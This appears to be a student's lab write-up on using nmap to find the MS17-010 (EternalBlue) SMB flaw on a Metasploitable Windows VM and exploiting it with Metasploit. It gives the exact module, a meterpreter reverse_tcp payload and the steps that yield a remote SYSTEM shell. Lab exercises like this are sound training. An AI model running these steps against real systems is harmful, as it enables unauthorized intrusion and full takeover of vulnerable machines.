# Eternal Blue

## Objective: 
To gain remote access, scan, and exploit SMB vulnerabilities with Nmap and Metasploit.

## Walkthrough:
- I initiated the assignment by executing the **ifconfig** command on my Kali VM, identifying the machine's IP address as 10.0.2.6.

<p align="center">
  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Eternal%20Blue/Assets/EB1.jpg" alt="">
</p>

- I then proceeded with an nmap scan targeting the IP address to locate the metasploitable Windows machine. The results showed the machine's IP address as 10.0.2.8, and the open ports 139 and 445 indicated the running SMB service.

<p align="center">
  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Eternal%20Blue/Assets/EB2.jpg" alt="">
</p>

- To leverage nse scripts, I ran **nmap -Pn -p139,445 --script=smbvuln-* 10.0.2.8**. The output highlighted the vulnerability **smb-vuln-ms17-010**, susceptible to remote code execution and classified as a high-risk factor.

<p align="center">
  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Eternal%20Blue/Assets/EB3.jpg" alt="">
</p>

- To proceed, I launched the Metasploit framework using the **msfconsole** command.

<p align="center">
  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Eternal%20Blue/Assets/EB4.jpg" alt="">
</p>

- Within Metasploit, I searched for the **eternalblue** exploit using **search eternalblue**.

<p align="center">
  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Eternal%20Blue/Assets/EB5.jpg" alt="">
</p>

- I selected the **MS17-010 EternalBlue SMB Remote Windows** module with **use exploit/windows/smb/ms17_010_eternalblue**. By default, the PAYLOAD was set to **windows/x64/meterpreter/reverse_tcp**. Necessary adjustments were made to RHOSTS (10.0.2.8, Target IP), LHOST (10.0.2.6, Kali IP), and LPORT (4444, designated listening port).

<p align="center">
  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Eternal%20Blue/Assets/EB6.jpg" alt="">
</p>

- Initiating the attack, I executed the **exploit** command.

<p align="center">
  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Eternal%20Blue/Assets/EB7.jpg" alt="">
</p>

- To confirm successful entry into the metasploitable VM, I ran **sysinfo**. Verification of the user-level access was achieved with the **getuid** command, revealing the access level as **SYSTEM** - the highest privilege on the machine.

<p align="center">
  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Eternal%20Blue/Assets/EB8.jpg" alt="">
</p>

- Lastly, to imprint my identity on the remote machine's terminal, I invoked the **shell** command.

<p align="center">
  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Eternal%20Blue/Assets/EB9.jpg" alt="">
</p>
